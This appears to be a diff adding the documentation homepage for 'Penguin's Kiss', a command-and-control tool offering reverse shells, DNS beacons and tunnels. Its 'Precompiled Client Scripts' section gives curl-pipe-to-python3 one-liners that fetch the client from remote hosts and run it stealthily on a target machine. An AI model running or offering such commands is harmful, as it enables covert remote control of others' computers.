@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta name="author" content="Carson Fleming" />
+        <meta name="description" content="Harness encrypted client-server communication, asynchronous command distribution, terminal emulation, and support for unlimited clients and controllers with Penguin's Kiss, the ultimate tool to manage remotely controlled devices with security and convenience." />
+        <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="stylesheet" type="text/css" href="/css/control.css" />
+        <title>Penguin&apos;s Kiss Command & Control Software | Penguin&apos;s Kiss</title>
+        <link rel="canonical" href="https://c2.pkctl.org/" />
+    </head>
+    <body>
+        <header id="banner">
+            <a id="banner-logo" href="/">
+                <img id="logo-img" src="/img/banner.webp" alt="Penguin&apos;s Kiss Banner" />
+            </a>
+            <div id="banner-buttons">
+                <a class="button" href="https://github.com/cflems/pk">GitHub</a>
+                <a class="button" href="https://github.com/cflems/pk/releases">Download</a>
+            </div>
+        </header>
+        <div id="page">
+            <nav id="navigation">
+                <h3 class="nav-heading"><a href="/">About PK</a></h3>
+                <ul class="nav-section">
+                    <li><a href="/#download">Downloading</a></li>
+                    <li><a href="/#build">Building</a></li>
+                    <li><a href="/#precompiled">Precompiled</a></li>
+                </ul>
+                <h3 class="nav-heading"><a href="/client">Client Config</a></h3>
+                <ul class="nav-section">
+                    <li><a href="/client#tts">Time to Sleep</a></li>
+                    <li><a href="/client#bits">RSA Bits</a></li>
+                </ul>
+                <h3 class="nav-heading"><a href="/server">Server Config</a></h3>
+                <ul class="nav-section">
+                    <li><a href="/server#install">Installing</a></li>
+                    <li><a href="/server#pkctl">PKCTL Usage</a></li>
+                    <li><a href="/server#keygen">Host Key Generation</a></li>
+                    <li><a href="/server#users">Local Users</a></li>
+                </ul>
+                <h3 class="nav-heading"><a href="/hdb">Hosts Database</a></h3>
+                <ul class="nav-section">
+                    <li><a href="/hdb#format">Format</a></li>
+                    <li><a href="/hdb#keys">Keys Section</a></li>
+                    <!-- Routes here soon. :) -->
+                </ul>
+                <h3 class="nav-heading"><a href="/commands">Command Reference</a></h3>
+                <ul class="nav-section">
+                    <li><a href="/commands#beacon">beacon</a></li>
+                    <li><a href="/commands#delbeacon">delbeacon</a></li>
+                    <li><a href="/commands#nbeacons">nbeacons</a></li>
+                    <li><a href="/commands#lbeacons">lbeacons</a></li>
+                    <li><a href="/commands#nscreen">nscreen</a></li>
+                    <li><a href="/commands#ncli">ncli</a></li>
+                    <li><a href="/commands#lcli">lcli</a></li>
+                    <li><a href="/commands#lq">lq</a></li>
+                    <li><a href="/commands#cq">cq</a></li>
+                    <li><a href="/commands#show-serverkey">show-serverkey</a></li>
+                    <li><a href="/commands#pty">pty</a></li>
+                    <li><a href="/commands#refresh-hdb">refresh-hdb</a></li>
+                    <li><a href="/commands#tunnel">tunnel</a></li>
+                    <li><a href="/commands#die">die</a></li>
+                    <li><a href="/commands#shell">Shell Commands</a></li>
+                    <li><a href="/commands#target">Targeting</a></li>
+                </ul>
+            </nav>
+            <div id="content">
+                <p>Penguin&apos;s Kiss is command and control software designed to accomodate a large
+                    number of clients and controllers at once. Multiple channels are available for
+                    end-to-end encrypted delivery of shell commands, including direct TCP reverse
+                    shell, DNS beacon, and beacon-triggered direct connection. All information is sent
+                    encrypted, either by padded RSA or by one-time pad exchanged over RSA (this helps
+                    to keep short data snippets responsive and avoid ballooning message size). In the
+                    future, some work may be done to incorporate elliptic curve cryptography and
+                    one-time session keys utilizing some symmetric cipher (likely AES).</p>
+                <section id="download">
+                    <h3>Downloading PK</h3>
+                    <p>The quickest way to download is via the button in the top right. This will take
+                        you to the latest release on
+                        <a href="https://github.com/cflems/pk">GitHub</a>. You can also clone the
+                        <a href="https://github.com/cflems/pk/tree/master">master</a> (pseudo-stable)
+                        or
+                        <a href="https://github.com/cflems/pk/tree/develop">develop</a> (unstable)
+                        branches to receive feature updates before they are bundled into a full
+                        release.</p>
+                </section>
+                <section id="build">
+                    <h3>Building PK</h3>
+                    <p>PK doesn&apos;t require much in the way of compilation, just bundling into a
+                        single script that can be distributed or run. This functionality is written in
+                        the makefile for easy access, so fetching and compilation should be as simple
+                        as:</p>
+                    <pre># or tar -xzf pk.tgz if you've downloaded an archive
+git clone git@github.com:cflems/pk.git
+cd pk
+make</pre>
+                    <p>Your built artifacts will be <code>pkcli.py</code> and <code>pkd.py</code>.
+                        Building is required before PK can be run for the first time.</p>
+                </section>
+                <section id="precompiled">
+                    <h3>Precompiled Client Scripts</h3>
+                    <p>Since cloning and building the latest version isn&apos;t the stealthiest
+                        procedure to execute on a client machine, prebuilt versions of the latest
+                        client script will be hosted in the several locations and can be executed
+                        without meaningful process footprint as follows:</p>
+                    <pre>curl -s https://dl.pkctl.org/pk.py | ENV=... python3 -</pre>
+                    <pre>curl -s https://war.cflems.net/pk.py | ENV=... python3 -</pre>
+                    <p>You may wish to host your own, however, in order to tweak the default values
+                        to your needs and avoid feeding them via enviornment variables.</p>
+                </section>
+            </div>
+        </div>
+    </body>
+</html>
